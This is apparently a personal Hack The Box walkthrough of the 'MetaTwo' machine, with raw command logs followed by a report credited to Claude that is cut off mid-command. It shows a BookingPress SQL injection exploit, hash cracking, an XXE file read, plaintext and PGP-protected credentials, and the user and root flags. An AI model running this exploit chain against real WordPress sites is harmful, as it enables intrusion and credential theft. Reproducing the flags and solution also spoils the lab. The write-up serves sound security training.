# MetaTwo

sudo nmap -sCV 10.129.228.95
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org/) ) at 2026-06-18 21:12 EDT
Stats: 0:03:41 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 95.83% done; ETC: 21:16 (0:00:02 remaining)
Nmap scan report for 10.129.228.95
Host is up (0.0094s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp?
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)
|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)
|_  256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to [http://metapress.htb/](http://metapress.htb/)
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	pwnbox7.1

The following lines are desirable for IPv6 capable hosts

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
127.0.0.1 localhost
127.0.1.1 htb-xqyyziskt6 [htb-xqyyziskt6.htb-cloud.com](http://htb-xqyyziskt6.htb-cloud.com/)
10.129.228.95 metapress.htb

no anonymous ftp

feroxbuster -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u [http://metapress.htb](http://metapress.htb/) -x php,html

302      GET        0l        0w        0c [http://metapress.htb/login](http://metapress.htb/login) => [http://metapress.htb/wp-login.php](http://metapress.htb/wp-login.php)

wordpress instance found 

wpscan --url [http://metapress.htb](http://metapress.htb/) --enumerate vp,vt,u,cb,dbe --plugins-detection aggressive

[+] admin
| Found By: Author Posts - Author Pattern (Passive Detection)
| Confirmed By:
|  Rss Generator (Passive Detection)
|  Wp Json Api (Aggressive Detection)
|   - [http://metapress.htb/wp-json/wp/v2/users/?per_page=100&page=1](http://metapress.htb/wp-json/wp/v2/users/?per_page=100&page=1)
|  Rss Generator (Aggressive Detection)
|  Author Sitemap (Aggressive Detection)
|   - [http://metapress.htb/wp-sitemap-users-1.xml](http://metapress.htb/wp-sitemap-users-1.xml)
|  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
|  Login Error Messages (Aggressive Detection)

[+] manager
| Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
| Confirmed By: Login Error Messages (Aggressive Detection)

● Bash(echo "=== plugins referenced in homepage ==="; curl -s
[http://metapress.htb/](http://metapress.htb/) | grep -oE 'wp-content/plugins/[^/]+' | sort -u
echo; echo "=== probe common plugin…)
⎿  Waiting…

● Bash(echo "=== bookingpress readme/version ==="; curl -s "[http://metapress.htb](http://metapress.htb/)
/wp-content/plugins/bookingpress-appointment-booking/readme.txt" | grep
-iE 'stable tag…)

git clone [https://github.com/viardant/CVE-2022-0739.git](https://github.com/viardant/CVE-2022-0739.git)
Cloning into 'CVE-2022-0739'...
remote: Enumerating objects: 15, done.
remote: Counting objects: 100% (15/15), done.
remote: Compressing objects: 100% (13/13), done.
remote: Total 15 (delta 4), reused 8 (delta 2), pack-reused 0 (from 0)
Receiving objects: 100% (15/15), 17.80 KiB | 17.80 MiB/s, done.
Resolving deltas: 100% (4/4), done.
┌─[us-dedivip-4]─[10.10.15.206]─[ronking37@htb-nh1ze5t8os]─[~]
└──╼ [★]$ cd CVE-2022-0739/

pip install -r requirements.txt

python [booking-sqlinjector.py](http://booking-sqlinjector.py/) -u [http://metapress.htb](http://metapress.htb/) -nu [http://metapress.htb/events/](http://metapress.htb/events/) -a -o db_dump

```
         █▀▀ █░█ █▀▀ ▄▄ ▀█ █▀█ ▀█ ▀█ ▄▄ █▀█ ▀▀█ █▀█
         █▄▄ ▀▄▀ ██▄ ░░ █▄ █▄█ █▄ █▄ ░░ █▄█ ░░█ ▀▀█
```

[*] DB Fingerprint: 10.5.15-MariaDB-0+deb11u1
[*] Users found: 2
{
"admin": {
"email": "admin@metapress.htb",
"password": "$[P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV](http://p$bgrgrgf2wtobs79i07rk9sn4fzk.tv/)."
},
"manager": {
"email": "manager@metapress.htb",
"password": "$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70"
}
}

sudo hashcat -m 400 /tmp/wp_hashonly.txt /usr/share/wordlists/rockyou.txt.gz

$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:partylikearockstar

![image.png](MetaTwo/image.png)

cd /home/ronking37/CVE-2021-29447

python3 [lfi.py](http://lfi.py/) -u manager -p partylikearockstar -t metapress.htb -lh
10.10.15.206 -lp 8082 /etc/passwd

python3 [lfi.py](http://lfi.py/) -u manager -p partylikearockstar -t metapress.htb -lh
10.10.15.206 -lp 8082 \
/var/www/metapress.htb/blog/wp-config.php \
/etc/nginx/sites-enabled/default

cat /home/ronking37/CVE-2021-29447/dump/*wp-config.php

1. Loot recovered from wp-config.php

DB:   blog : 635Aq@TdqrCwXFUZ          (MySQL, localhost-only)
FTP:  metapress.htb : 9NYS_ii@FyL_p5M2NvJ   (ftp.metapress.htb -> port 21,
OPEN)

ftp metapress.htb@ftp.metapress.htb
Connected to metapress.htb.
220 ProFTPD Server (Debian) [::ffff:10.129.228.95]
331 Password required for metapress.htb
Password:
230 User metapress.htb logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||29743|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5  2022 blog
drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5  2022 mailer
226 Transfer complete
ftp> cd blog
250 CWD command successful
ftp> ls
229 Entering Extended Passive Mode (|||42513|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 metapress.htb metapress.htb      405 Feb  6  2020 index.php
-rw-r--r--   1 metapress.htb metapress.htb    19915 Feb 12  2020 license.txt
-rw-r--r--   1 metapress.htb metapress.htb     7278 Jun 26  2020 readme.html
-rw-r--r--   1 metapress.htb metapress.htb     7101 Jul 28  2020 wp-activate.php
drwxr-xr-x   9 metapress.htb metapress.htb     4096 Oct  5  2022 wp-admin
-rw-r--r--   1 metapress.htb metapress.htb      351 Feb  6  2020 wp-blog-header.php
-rw-r--r--   1 metapress.htb metapress.htb     2328 Oct  8  2020 wp-comments-post.php
-rw-r--r--   1 metapress.htb metapress.htb     2032 Jun 23  2022 wp-config.php
-rw-r--r--   1 metapress.htb metapress.htb     2913 Feb  6  2020 wp-config-sample.php
drwxr-xr-x   6 metapress.htb metapress.htb     4096 Oct  5  2022 wp-content
-rw-r--r--   1 metapress.htb metapress.htb     3939 Jul 30  2020 wp-cron.php
drwxr-xr-x  25 metapress.htb metapress.htb    12288 Oct  5  2022 wp-includes
-rw-r--r--   1 metapress.htb metapress.htb     2496 Feb  6  2020 wp-links-opml.php
-rw-r--r--   1 metapress.htb metapress.htb     3300 Feb  6  2020 wp-load.php
-rw-r--r--   1 metapress.htb metapress.htb    49831 Nov  9  2020 wp-login.php
-rw-r--r--   1 metapress.htb metapress.htb     8509 Apr 14  2020 wp-mail.php
-rw-r--r--   1 metapress.htb metapress.htb    20975 Nov 12  2020 wp-settings.php
-rw-r--r--   1 metapress.htb metapress.htb    31337 Sep 30  2020 wp-signup.php
-rw-r--r--   1 metapress.htb metapress.htb     4747 Oct  8  2020 wp-trackback.php
-rw-r--r--   1 metapress.htb metapress.htb     3236 Jun  8  2020 xmlrpc.php
226 Transfer complete
ftp> cd ..
250 CWD command successful
ftp> ls
229 Entering Extended Passive Mode (|||6821|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5  2022 blog
drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5  2022 mailer
226 Transfer complete
ftp> cd mailer
250 CWD command successful
ftp> ls
229 Entering Extended Passive Mode (|||58964|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   4 metapress.htb metapress.htb     4096 Oct  5  2022 PHPMailer
-rw-r--r--   1 metapress.htb metapress.htb     1126 Jun 22  2022 send_email.php
226 Transfer complete
ftp> get send_email.php
local: send_email.php remote: send_email.php
229 Entering Extended Passive Mode (|||54769|)
150 Opening BINARY mode data connection for send_email.php (1126 bytes)
100% |***********************************|  1126      616.71 KiB/s    00:00 ETA
226 Transfer complete
1126 bytes received in 00:00 (71.62 KiB/s)
ftp> cd PHPMailer
250 CWD command successful
ftp> ls
229 Entering Extended Passive Mode (|||28412|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 metapress.htb metapress.htb     2092 Jun 20  2022 COMMITMENT
-rw-r--r--   1 metapress.htb metapress.htb     2503 Jun 20  2022 composer.json
-rw-r--r--   1 metapress.htb metapress.htb     5521 Jun 20  2022 get_oauth_token.php
drwxr-xr-x   2 metapress.htb metapress.htb     4096 Oct  5  2022 language
-rw-r--r--   1 metapress.htb metapress.htb    26529 Jun 20  2022 LICENSE
-rw-r--r--   1 metapress.htb metapress.htb    16240 Jun 20  2022 [README.md](http://readme.md/)
-rw-r--r--   1 metapress.htb metapress.htb     7584 Jun 20  2022 [SECURITY.md](http://security.md/)
drwxr-xr-x   2 metapress.htb metapress.htb     4096 Oct  5  2022 src
-rw-r--r--   1 metapress.htb metapress.htb        5 Jun 20  2022 VERSION

cat send_email.php
<?php
/*

- This script will be used to send an email to all our users when ready for launch
*/

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

$mail = new PHPMailer(true);

$mail->SMTPDebug = 3;

$mail->isSMTP();

$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;

$mail->Username = "jnelson@metapress.htb";

$mail->Password = "Cb4_JmWM8zUZWMu@Ys";

$mail->SMTPSecure = "tls";

$mail->Port = 587;

$mail->From = "jnelson@metapress.htb";
$mail->FromName = "James Nelson";

$mail->addAddress("info@metapress.htb");

$mail->isHTML(true);

$mail->Subject = "Startup";
$mail->Body = "<i>We just started our new blog metapress.htb!</i>";

try {
$mail->send();
echo "Message has been sent successfully";
} catch (Exception $e) {
echo "Mailer Error: " . $mail->ErrorInfo;
}

jnelson@metapress.htb:Cb4_JmWM8zUZWMu@Ys

ssh jnelson@metapress.htb
jnelson@metapress.htb's password:
Linux meta2 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Oct 25 12:51:26 2022 from 10.10.14.23
jnelson@meta2:~$ id
uid=1000(jnelson) gid=1000(jnelson) groups=1000(jnelson)
jnelson@meta2:~$ hostname
meta2
jnelson@meta2:~$ ls
user.txt
jnelson@meta2:~$ cat user.txt
e282845bea00b5bfe43641f2702b1096

jnelson@meta2:~$ ls -la
total 36
drwxr-xr-x 4 jnelson jnelson 4096 Jun 19 15:50 .
drwxr-xr-x 3 root    root    4096 Oct  5  2022 ..
lrwxrwxrwx 1 root    root       9 Jun 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 jnelson jnelson  220 Jun 26  2022 .bash_logout
-rw-r--r-- 1 jnelson jnelson 3526 Jun 26  2022 .bashrc
drwxr-xr-x 3 jnelson jnelson 4096 Oct 25  2022 .local
-rw------- 1 jnelson jnelson   95 Jun 19 15:50 .mysql_history
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25  2022 .passpie
-rw-r--r-- 1 jnelson jnelson  807 Jun 26  2022 .profile
-rw-r----- 1 root    jnelson   33 Jun 19 02:12 user.txt
jnelson@meta2:~$ cat .passpie/
cat: .passpie/: Is a directory
jnelson@meta2:~$ cd .passpie/
jnelson@meta2:~/.passpie$ ls
ssh
jnelson@meta2:~/.passpie$ ls -la
total 24
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25  2022 .
drwxr-xr-x 4 jnelson jnelson 4096 Jun 19 15:50 ..
-r-xr-x--- 1 jnelson jnelson    3 Jun 26  2022 .config
-r-xr-x--- 1 jnelson jnelson 5243 Jun 26  2022 .keys
dr-xr-x--- 2 jnelson jnelson 4096 Oct 25  2022 ssh
jnelson@meta2:~/.passpie$ cd ssh
jnelson@meta2:~/.passpie/ssh$ ls
jnelson.pass  root.pass
jnelson@meta2:~/.passpie/ssh$ cat root.pass
comment: ''
fullname: root@ssh
login: root
modified: 2022-06-26 08:58:15.621572
name: ssh
password: '-----BEGIN PGP MESSAGE-----

hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2

nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km

yG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED

/2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf

iMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg

krndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw

mboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr

lpF0RatbxQGWBks5F3o=

=uh1B

- ----END PGP MESSAGE-----

'

jnelson@meta2:~/.passpie$ ls -la
total 24
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25  2022 .
drwxr-xr-x 4 jnelson jnelson 4096 Jun 19 15:50 ..
-r-xr-x--- 1 jnelson jnelson    3 Jun 26  2022 .config
-r-xr-x--- 1 jnelson jnelson 5243 Jun 26  2022 .keys
dr-xr-x--- 2 jnelson jnelson 4096 Oct 25  2022 ssh
jnelson@meta2:~/.passpie$ cd .keys
-bash: cd: .keys: Not a directory
jnelson@meta2:~/.passpie$ cat .keys
-----BEGIN PGP PUBLIC KEY BLOCK-----

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
fo6KI+w2uXLaw+bIT1XZurDN
=dqsF
-----END PGP PUBLIC KEY BLOCK-----
-----BEGIN PGP PRIVATE KEY BLOCK-----

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
=7Uo6
-----END PGP PRIVATE KEY BLOCK-----

┌─[us-dedivip-4]─[10.10.15.206]─[ronking37@htb-nh1ze5t8os]─[~]
└──╼ [★]$ vi keys
┌─[us-dedivip-4]─[10.10.15.206]─[ronking37@htb-nh1ze5t8os]─[~]
└──╼ [★]$ gpg2john keys

File keys
Passpie:$gpg$*17*54*3072*e975911867862609115f302a3d0196aec0c2ebf79a84c0303056df921c965e589f82d7dd71099ed9749408d5ad17a4421006d89b49c0*3*254*2*7*16*21d36a3443b38bad35df0f0e2c77f6b9*65011712*907cb55ccb37aaad:::Passpie (Auto-generated by Passpie) [passpie@local](mailto:passpie@local)::keys
┌─[us-dedivip-4]─[10.10.15.206]─[ronking37@htb-nh1ze5t8os]─[~]
└──╼ [★]$ vi hash
┌─[us-dedivip-4]─[10.10.15.206]─[ronking37@htb-nh1ze5t8os]─[~]
└──╼ [★]$ john hash --wordlist=/usr/share/wordlists/rockyou.txt.gz
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
No password hashes left to crack (see FAQ)

┌─[us-dedivip-4]─[10.10.15.206]─[ronking37@htb-nh1ze5t8os]─[~/.john]
└──╼ [★]$ cat john.pot
$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:partylikearockstar
$gpg$*17*54*3072*e975911867862609115f302a3d0196aec0c2ebf79a84c0303056df921c965e589f82d7dd71099ed9749408d5ad17a4421006d89b49c0*3*254*2*7*16*21d36a3443b38bad35df0f0e2c77f6b9*65011712*907cb55ccb37aaad:blink182

nelson@meta2:~/.passpie$ passpie
╒════════╤═════════╤════════════╤═══════════╕
│ Name   │ Login   │ Password   │ Comment   │
╞════════╪═════════╪════════════╪═══════════╡
│ ssh    │ jnelson │ ********   │           │
├────────┼─────────┼────────────┼───────────┤
│ ssh    │ root    │ ********   │           │
╘════════╧═════════╧════════════╧═══════════╛

jnelson@meta2:~/.passpie$ passpie export --passphrase blink182 /dev/stdout
credentials:

- comment: ''
fullname: root@ssh
login: root
modified: 2022-06-26 08:58:15.621572
name: ssh
password: !!python/unicode 'p7qfAZt4_A1xo_0x'
- comment: ''
fullname: jnelson@ssh
login: jnelson
modified: 2022-06-26 08:58:15.514422
name: ssh
password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'
handler: passpie
version: 1.0

jnelson@meta2:~/.passpie$ su root
Password:
root@meta2:/home/jnelson/.passpie# cd /root
root@meta2:~# ls
restore  root.txt
root@meta2:~# cat root.txt
42461a3fb5c81d16d54c9afce535a9c9

CLAUDE’s writeup 

# Penetration Test Report — HTB: MetaTwo

|  |  |
| --- | --- |
| **Target** | `metapress.htb` — `10.129.228.95` |
| **Engagement type** | Hack The Box — authorized lab exercise |
| **Date** | 2026-06-19 |
| **Tester** | ronking37 (`8illitnas@gmail.com`) |
| **Attacker IP (tun0)** | `10.10.15.206` |
| **Result** | Full compromise — `root` |

---

## 1. Executive Summary

MetaTwo is a Linux host running a WordPress 5.6.2 site behind nginx. The box was
compromised end-to-end by chaining five distinct issues:

1. An **unauthenticated SQL injection** in the BookingPress plugin (CVE-2022-0739)
exposed the WordPress user password hashes.
2. The `manager` account's phpass hash was **cracked offline** to a plaintext password.
3. Authenticated access to the media library enabled a **blind XXE** (CVE-2021-29447)
to read arbitrary files, including `wp-config.php`.
4. `wp-config.php` leaked **FTP credentials**; FTP enumeration surfaced a stored
credential that was **reused** for the `jnelson` system account over SSH.
5. A **GPG-protected `passpie` vault** in `jnelson`'s home held the root SSH password;
the GPG private key was exported and its passphrase cracked offline, yielding `root`.

Both flags were captured:

| Flag | Value |
| --- | --- |
| user | `e282845bea00b5bfe43641f2702b1096` |
| root | `42461a3fb5c81d16d54c9afce535a9c9` |

---

## 2. Enumeration

### 2.1 Host discovery / hosts file

The site redirects to the `metapress.htb` vhost, so the name was mapped locally:

```bash
echo "10.129.228.95 metapress.htb" | sudo tee -a /etc/hosts
```

### 2.2 Port scan

```bash
sudo nmap -sCV 10.129.228.95
```

| Port | Service | Version |
| --- | --- | --- |
| 21/tcp | FTP | ProFTPD (no anonymous login) |
| 22/tcp | SSH | OpenSSH 8.4p1 Debian 5+deb11u1 |
| 80/tcp | HTTP | nginx 1.18.0 → redirects to `http://metapress.htb/` |

### 2.3 Web / WordPress enumeration

```bash
feroxbuster -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \
            -u <http://metapress.htb> -x php,html
#  /login -> 302 -> /wp-login.php  (WordPress confirmed)

wpscan --url <http://metapress.htb> --enumerate vp,vt,u,cb,dbe --plugins-detection aggressive
#  Users discovered: admin, manager
```

Version fingerprinting:

```bash
curl -s <http://metapress.htb/> | grep -i generator
#  <meta name="generator" content="WordPress 5.6.2" />

curl -s <http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/readme.txt> | grep -i 'stable tag'
#  Stable tag: 1.0.10        <-- vulnerable
```

---

## 3. Initial Foothold

### 3.1 CVE-2022-0739 — BookingPress unauthenticated SQL injection

**Component:** BookingPress Appointment Booking ≤ 1.0.10
**Type:** Unauthenticated UNION-based SQL injection
**Endpoint:** `POST /wp-admin/admin-ajax.php`, action `bookingpress_front_get_category_services`, parameter `total_service`.

The plugin requires a `_wpnonce`, which it publicly renders on any page that
displays the booking calendar (here, `/events/`):

```bash
curl -s "<http://metapress.htb/events/>" | grep -oE "nonce:'[a-f0-9]+'"
#  -> b4ad88951f
```

Injection confirmed (DB version reflected in the 9th column):

```bash
NONCE=b4ad88951f
curl -s -X POST "<http://metapress.htb/wp-admin/admin-ajax.php>" \
